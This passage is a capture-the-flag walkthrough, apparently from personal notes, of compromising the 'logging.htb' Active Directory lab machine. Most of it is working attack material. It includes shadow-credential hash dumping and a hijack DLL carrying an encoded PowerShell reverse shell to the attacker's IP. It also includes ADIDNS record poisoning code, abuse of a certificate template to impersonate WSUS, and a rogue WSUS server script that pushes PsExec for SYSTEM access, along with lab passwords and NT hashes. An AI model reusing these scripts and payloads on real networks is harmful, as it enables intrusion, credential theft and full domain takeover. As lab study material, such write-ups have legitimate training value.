[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '824cc0fea68144a79d0ac0f1a95f3678'
[*] Adding Key Credential with device ID '824cc0fea68144a79d0ac0f1a95f3678' to the Key Credentials for 'msa_health$'
[*] Successfully added Key Credential with device ID '824cc0fea68144a79d0ac0f1a95f3678' to the Key Credentials for 'msa_health$'
[*] Authenticating as 'msa_health$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'msa_health$@logging.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'msa_health.ccache'
[*] Wrote credential cache to 'msa_health.ccache'
[*] Trying to retrieve NT hash for 'msa_health$'
[*] Restoring the old Key Credentials for 'msa_health$'
[*] Successfully restored the old Key Credentials for 'msa_health$'
[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
```
![[Pasted image 20260421095427.png]]
- Note: possible code to manually change an entry (did not work for me) :
```
import ldap3
from impacket.ldap import ldaptypes

s = ldap3.Server('<TARGET_IP>')
c = ldap3.Connection(s, user='logging.htb\\svc_recovery',
                     password='Em3rg3ncyPa$$2026',
                     authentication=ldap3.NTLM, auto_bind=True)

sid = 'S-1-5-21-4020823815-2796529489-1682170552-1103'  # wallace.everette
sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 32772
sd['OwnerSid'] = ldaptypes.LDAP_SID(); sd['OwnerSid'].fromCanonical('S-1-5-18')
sd['GroupSid'] = b''
sd['Sacl'] = b''
acl = ldaptypes.ACL(); acl['AclRevision'] = 4; acl['Sbz1'] = 0; acl['Sbz2'] = 0
ace = ldaptypes.ACE(); ace['AceType'] = 0; ace['AceFlags'] = 0
nace = ldaptypes.ACCESS_ALLOWED_ACE(); nace['Mask'] = ldaptypes.ACCESS_MASK()
nace['Mask']['Mask'] = 983551
nace['Sid'] = ldaptypes.LDAP_SID(); nace['Sid'].fromCanonical(sid)
ace['Ace'] = nace
acl.aces = [ace]; sd['Dacl'] = acl

c.modify('CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb',
         {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]})
print(c.result)
```

- I can now log in to the target with the hash:
```
evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```
![[Pasted image 20260421095138.png]]

- CHecking `C:\ProgramData\UpdateMonitor\Logs` I find some logs which point to a DLL being used:
```
type monitor.log
[2026-04-16 16:41:18] Starting Sentinel Update Check...
[2026-04-16 16:41:18] Checking for update on core server...
[2026-04-16 16:41:18] Info: Core did not find file Settings_Update.zip
[2026-04-16 16:41:18] Last status: File not found on core
[2026-04-16 16:41:18] Checking for update on local server...
[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
```

- I try to create a directory `bin` in UpdatemMonitor to see if I can create files here and I can:
![[Pasted image 20260421100223.png]]

- Looking at the log again it takes a zip file from ProgramData and uploads it to Program Files location with a DLL. Going to that location I find an executable
![[Pasted image 20260421102038.png]]

![[Pasted image 20260421100715.png]]

- It's 32 bit so I need to create my DLL as a 32 bit file.
- First I create my DLL payload.c file:
```
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 
        { 
                if (ul_reason_for_call == DLL_PROCESS_ATTACH) 
                        { system("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA2ADcAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"); } 
                return TRUE; 
        }
```
- Or more cleaner so you can check logs to see if it executes, we can create PreUpdateCheck function and execute our command in it: This is a cert but we can pass that in a shell nwe get from our reverse shell just replace the command with our reverse shell command above
```
// cert_submit.c
// Compile: i686-w64-mingw32-gcc -shared -o settings_update.dll cert_submit.c -s
#include <windows.h>

__declspec(dllexport) void PreUpdateCheck(void) {
    system("cmd /c certreq -f -submit "
           "-attrib \"CertificateTemplate:UpdateSrv\" "
           "-config \"DC01.logging.htb\\logging-DC01-CA\" "
           "C:\\ProgramData\\UpdateMonitor\\req.csr "
           "C:\\ProgramData\\UpdateMonitor\\cert.cer "
           "> C:\\ProgramData\\UpdateMonitor\\submit_log.txt 2>&1 < NUL");
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
```
- Or combine the two?
```
#include <windows.h>

__declspec(dllexport) void PreUpdateCheck(void) {
    system("cmd /c certreq -f -submit "
           "-attrib \"CertificateTemplate:UpdateSrv\" "
           "-config \"DC01.logging.htb\\logging-DC01-CA\" "
           "C:\\ProgramData\\UpdateMonitor\\req.csr "
           "C:\\ProgramData\\UpdateMonitor\\cert.cer "
           "> C:\\ProgramData\\UpdateMonitor\\submit_log.txt 2>&1 < NUL");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 
        { 
                if (ul_reason_for_call == DLL_PROCESS_ATTACH) 
                        { system("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA2ADcAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"); } 
                return TRUE; 
        }
```

- Then I create the DLL for 32 bit with mingw:
```
i686-w64-mingw32-gcc -shared -o settings_update.dll payload.c -s
zip -j Settings_Update.zip settings_update.dll
  adding: settings_update.dll (deflated 59%)
```

![[Pasted image 20260421101618.png]]

- finally I upload it to the target at `C:\ProgramData\UpdateMonitor\`
![[Pasted image 20260421101648.png]]
- I get a shell as `jaylee.clifton`:
![[Pasted image 20260421102112.png]]

- I grab user flag:
![[Pasted image 20260421102203.png]]

- I check for vulnerable certificates:
```
faketime "+7hours" certipy-ad find \
  -u 'msa_health$@logging.htb' -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
  -target DC01.logging.htb -dc-ip 10.129.36.182 \
  -stdout -enabled
```
![[Pasted image 20260421102605.png]]

- The template UpdateSrv stands out.
- IT has enrolee ermissions which jaylee is a part of :
![[Pasted image 20260421102912.png]]
`The template carries a Server Authentication EKU rather than Client Authentication, making it unsuitable for classic PKINIT ESC1 Kerberos authentication, but perfectly suitable for impersonating any HTTPS service the domain trusts — in this case, the WSUS endpoint wsus.logging.htb:8531.`

- also from winPEAS that i checked via ms_health$ account we see WSUS is running :
![[Pasted image 20260421104428.png]]
- Using the code I build a req.csr and upload to C:\ProgramData'UpdateMonitor:
```
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open('wsus_key.pem', 'wb').write(pk.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()))

csr = (x509.CertificateSigningRequestBuilder()
       .subject_name(x509.Name([
           x509.NameAttribute(NameOID.COMMON_NAME, 'wsus.logging.htb')]))
       .add_extension(x509.SubjectAlternativeName([
           x509.DNSName('wsus.logging.htb'), x509.DNSName('wsus')]), critical=False)
       .sign(pk, hashes.SHA256()))
open('req.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))
```

```
python3 build_wsus_csr.py
```

```
wget http://10.10.17.167/req.csr -o C:\ProgramData\UpdateMonitor\req.csr
```
![[Pasted image 20260421112957.png]]

- Then I pass this command on my shell as jaylee
```
cmd /c certreq -f -submit -attrib "CertificateTemplate:UpdateSrv" -config "DC01.logging.htb\logging-DC01-CA" "C:\ProgramData\UpdateMonitor\req.csr" "C:\ProgramData\UpdateMonitor\cert.cer"

---OUTPUT--
RequestId: 10
RequestId: "10"
Certificate retrieved(Issued) Issued
```
![[Pasted image 20260421165712.png]]

- Then looking at the file I see a cert.cer:
![[Pasted image 20260421164308.png]]
- I download it and convert it to a pfx file:
```
openssl pkcs12 -export \ 
  -out wsus_srv.pfx \
  -inkey wsus_key.pem \
  -in   cert.cer \ 
  -passout pass:

openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_cert.pem -clcerts -nokeys -passin pass:
openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_key.pem  -nocerts  -nodes  -passin pass:

---OUTPUT---
openssl x509 -in wsus_srv_cert.pem -noout -subject -ext subjectAltName
subject=CN=wsus.logging.htb
X509v3 Subject Alternative Name: 
    DNS:wsus.logging.htb, DNS:wsus
```
![[Pasted image 20260421165749.png]]

- We add a computer account:
```
faketime "+7hours" impacket-addcomputer \
  -computer-name 'attacker01$' -computer-pass 'SuperP@ss!' \
  -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
  -dc-ip 10.129.36.218 \
  'logging.htb/msa_health$'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account attacker01$ with password SuperP@ss!
```
![[Pasted image 20260421165811.png]]
- Now we need to poison the DNS. We use this python code :
```
# add_dns.py
import ldap3, struct

ATTACKER_IP = '10.10.17.167'
ip = bytes(int(x) for x in ATTACKER_IP.split('.'))
# DNS_RPC_RECORD_A: DataLen(2) Type(2) Ver(1) Rank(1) Flags(2) Serial(4) Ttl(4) Reserved(4) TimeStamp(4) Data(4)
record = struct.pack('<HHBBHIIII', 4, 1, 5, 0xF0, 0, 1, 180, 0, 0) + ip

s = ldap3.Server('<TARGET_IP>', port=389)
c = ldap3.Connection(s, user='logging.htb\\attacker01$', password='SuperP@ss!',
                     authentication=ldap3.NTLM, auto_bind=True)
c.add('DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb',
      ['top', 'dnsNode'],
      {'dnsRecord': [record], 'dnsTombstoned': 'FALSE'})
print(c.result)
```
![[Pasted image 20260421165829.png]]
- After a few minutes we can flush dns and check on jaylee's account (ms_health$ requires elevated privileges)
```
ipconfig /flushdns

---OUTPUT---
Windows IP Configuration

Successfully flushed the DNS Resolver Cache.
```
![[Pasted image 20260421165912.png]]
```
Resolve-DnsName wsus.logging.htb

Name                                           Type   TTL   Section    IPAddress                                
----                                           ----   ---   -------    ---------                                
wsus.logging.htb                               A      30198 Answer     10.10.17.167                             
                                                      98880
```
![[Pasted image 20260421165934.png]]

- Now we use wsuks. We create the file run_wsuks.py:
```
# run_wsuks.py — serve-only mode on both 8530 (HTTP content) and 8531 (HTTPS WSUS)
import ssl, sys, os, logging, threading
from functools import partial
from http.server import HTTPServer

# Stub the ARP / nftables module before wsuks' server imports it
sys.modules['wsuks.lib.router'] = type(sys)('stub')
sys.modules['wsuks.lib.router'].Router = object

from wsuks.lib.logger import initLogger
initLogger(debug=False)
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

HOST = '10.10.17.167'
EXE  = 'PsExec64.exe'

COMMAND = ('/accepteula /s cmd.exe /c "'
           'net localgroup administrators msa_health$ /add 2>&1 > C:\\Share\\Logs\\PWN.txt & '
           'net localgroup administrators >> C:\\Share\\Logs\\PWN.txt 2>&1 & '
           'icacls C:\\Share\\Logs\\PWN.txt /grant Everyone:F"')

exe_bytes = open(EXE, 'rb').read()
h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
h.set_resources_xml(COMMAND)
log = logging.getLogger('wsuks')

def serve(port, use_tls):
    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('wsus_srv_cert.pem', 'wsus_srv_key.pem')
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        log.info(f'HTTPS WSUS on {HOST}:{port}')
    else:
        log.info(f'HTTP content on {HOST}:{port}')
    httpd.serve_forever()

threading.Thread(target=serve, args=(8530, False), daemon=True).start()
serve(8531, True)
```
- Some info on wsuks: https://github.com/NeffIsBack/wsuks
- Some info on pywsus: https://github.com/GoSecure/pywsus
```
python3 -m venv ~/venvs/wsuks
source ~/venvs/wsuks/bin/activate
pip install wsuks
python3 run_wsuks.py
```
![[Pasted image 20260421170042.png]]
![[Pasted image 20260421170011.png]]

- Then on jaylee's shell we run the following commands to force Windows Update Detection:
```
Stop-Service wuauserv -Force
Remove-Item 'C:\Windows\SoftwareDistribution' -Recurse -Force
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```
![[Pasted image 20260421170112.png]]

- We get two GET command responses from run_wsuks
```
python3 run_wsuks.py
[*] HTTP content on 10.10.17.167:8530
[*] HTTPS WSUS on 10.10.17.167:8531
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"
[+] Received GET request: /00a64fee-4cef-4506-a93d-e72fa82756e4/PsExec64.exe
[+] GET request for exe: /00a64fee-4cef-4506-a93d-e72fa82756e4/PsExec64.exe
```
![[Pasted image 20260421170138.png]]

- After maybe a mninute we can confirm on jaylee's shell by checking PWN.txt:
```
Get-Content C:\Share\Logs\PWN.txt
The command completed successfully.

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
msa_health$
toby.brynleigh
The command completed successfully.
```
![[Pasted image 20260421170209.png]]

- We can connect to `msa_health$` on a new session and confirm we are admin:
```
evil-winrm -i 10.129.36.218 -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

- Confirming:
```
whoami /groups | findstr /i admin
 
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
```
![[Pasted image 20260421170239.png]]

- I can grab the root flag from `toby,brynleigh`'s Desktop:
![[Pasted image 20260421165535.png]]

```
Get-ChildItem 'C:\Users\' -Recurse -Force -Filter '*.txt' -EA 0 |
  ForEach-Object { try {
      $c = Get-Content $_.FullName -TotalCount 1 -EA 0
      if ($c -match '^[a-f0-9]{32}$') { "$($_.FullName): $c" }
  } catch {} }
```
![[Pasted image 20260421170259.png]]

-------
### Shell as system
- Alternatively I used the wsuks.py from the github link and passed my reverse shell instead as the injection:https://github.com/NeffIsBack/wsuks/tree/master
- Serving wsus server after DNS poisoning
```
sudo wsuks --serve-only --tls-cert wsus_combined.pem -e PsExec64.exe -c '/accepteula /s cmd.exe /c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAyADYAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"' --WSUS-Server 10.10.16.126 -I tun0
```
![[Pasted image 20260423063727.png]]
![[Pasted image 20260423063753.png]]
- trigger the update on `jayleen`'s shell :
```
Stop-Service wuauserv -Force
Remove-Item 'C:\Windows\SoftwareDistribution' -Recurse -Force
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```
![[Pasted image 20260423063920.png]]

- I grab a shell on my netcat listener as `nt authority/system` (i used 9999 again so timing it had to be right or we'd get jayleen's shelll so better to use another port)
![[Pasted image 20260423063957.png]]
- I grab the root flag:
![[Pasted image 20260423064044.png]]

------
# Added notes to read:

Enumerate the UpdateSrv Certificate Template
With jaylee.clifton effectively available through the DLL, the interesting pivot is ADCS. Enumerate templates with Certipy:

faketime -f "+7h" certipy-ad find \
  -u 'msa_health$@logging.htb' -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
  -target DC01.logging.htb -dc-ip <TARGET_IP> \
  -stdout -enabled
The custom template UpdateSrv stands out:

Template Name                 : UpdateSrv
Schema Version                : 2
Client Authentication         : False
Enrollee Supplies Subject     : True
Extended Key Usage            : Server Authentication
Enrollment Rights             : LOGGING\IT
It's not directly exploitable via PKINIT (Server Authentication EKU only — Kerberos rejects it with KDC_ERR_INCONSISTENT_KEY_PURPOSE), but it's exactly what WSUS wants for its HTTPS certificate: a machine-auth cert whose SAN we control.

Only the IT group can enroll. jaylee.clifton is in IT, and we execute as her via the DLL.


-------
Create a Machine Account and Poison DNS
The DC is configured to fetch updates from https://wsus.logging.htb:8531, but no wsus record exists in the AD-integrated DNS zone. We need it to resolve to us.

msa_health$ has SeMachineAccountPrivilege, which lets us add a new computer account (the MachineAccountQuota is 10 by default). Any authenticated computer can register records in the DNS zone via dnsNode create-child rights granted to Authenticated Users by default.


-----
Insert the A record over LDAP in the MS-DNSP binary format: (dns.py)

----
Rogue WSUS Server with wsuks
Why wsuks and not pywsus
The obvious tool is pywsus, but against a Server 2019 DC it fails silently. Its sync-updates.xml advertises the update under a Windows product category the DC isn't a member of, so after SyncUpdates the client logs "Windows Update Client successfully detected 0 updates." and never calls GetExtendedUpdateInfo. wsuks ships a simpler sync-updates.xml without the prerequisite, and the DC follows through.


----
Privilege Escalation to Local Administrator
A minute after the GETs, the DC runs PsExec64 /accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add..." as SYSTEM. Verify from our existing WinRM session:

---
Key Takeaways
Log Hygiene Is a Credential Store
An ADCS-enabled, hardened Active Directory environment still fell to a plaintext password in a readable file share. Old IdentitySync traces that look harmless contain bind credentials.

gMSA Access Is a Transitive Privilege
GenericWrite on a gMSA is equivalent to holding its password — you can grant yourself read access on msDS-GroupMSAMembership and dump the NT hash whenever you want.

Scheduled-Task DLL Hijacks Are a User-Impersonation Primitive
Any user that can write to the input directory of a scheduled task running as another principal effectively executes as that principal. On Logging the input was a zip file; the task unpacked it into Program Files\...\bin\ and loaded the DLL.

UpdateSrv + ENROLLEE_SUPPLIES_SUBJECT = WSUS-Server-Trust Anchor
The template is not a PKINIT primitive — Server Authentication EKU won't do Kerberos — but it is exactly the material needed to impersonate any HTTPS service the DC trusts, including its own WSUS endpoint.

SeMachineAccountPrivilege + Default DNS ACLs = MITM Without ARP
Creating a computer account gives you a DNS writer. No ARP spoofing, no layer-2 access — a pure AD-level primitive.

pywsus vs wsuks on Server 2019
pywsus advertises updates under a Windows product category the server OS isn't in, and the client drops the sync as "0 updates detected". wsuks uses a minimal sync-updates.xml without the prerequisite and the install proceeds. Verify by checking C:\Windows\SoftwareDistribution\ReportingEvents.log on the target for [AGENT_DETECTION_FINISHED] entries.

Always Tame Subprocesses in Looping Tasks
Never spawn an interactive-prone binary (certreq, net use, netsh) from inside a DLL loaded by a repeating task without -f//y//quiet flags and < NUL. A single hung child will freeze the DLL load slot for the duration of the box.



-------
- For the cert update dll zip file:

Two traps worth calling out explicitly — both cost hours on the live box:

Use -f on certreq and redirect stdin from NUL. Without -f, certreq prompts to overwrite cert.rsp; without < NUL, any unexpected prompt blocks forever. A hung PreUpdateCheck never calls FreeLibrary, which keeps settings_update.dll locked on disk — every subsequent task trigger fails its File.Delete, you lose the ability to update the DLL, and you need a box reset.
The DLL must be 32-bit. A 64-bit DLL returns LoadLibrary error 193 (ERROR_BAD_EXE_FORMAT) because of the Prefer 32-bit flag on the .NET host.


------
Note that if we had jaylee's password we couldve requested the cert via certipy-ad

```
certipy-ad req -u 'jaylee.clifton@logging.htb' -p '<PASS>' -ca 'logging-DC01-CA' -template 'UpdateSrv' -upn 'wsus.logging.htb' -dns 'wsus.logging.htb' -target dc01.logging.htb
```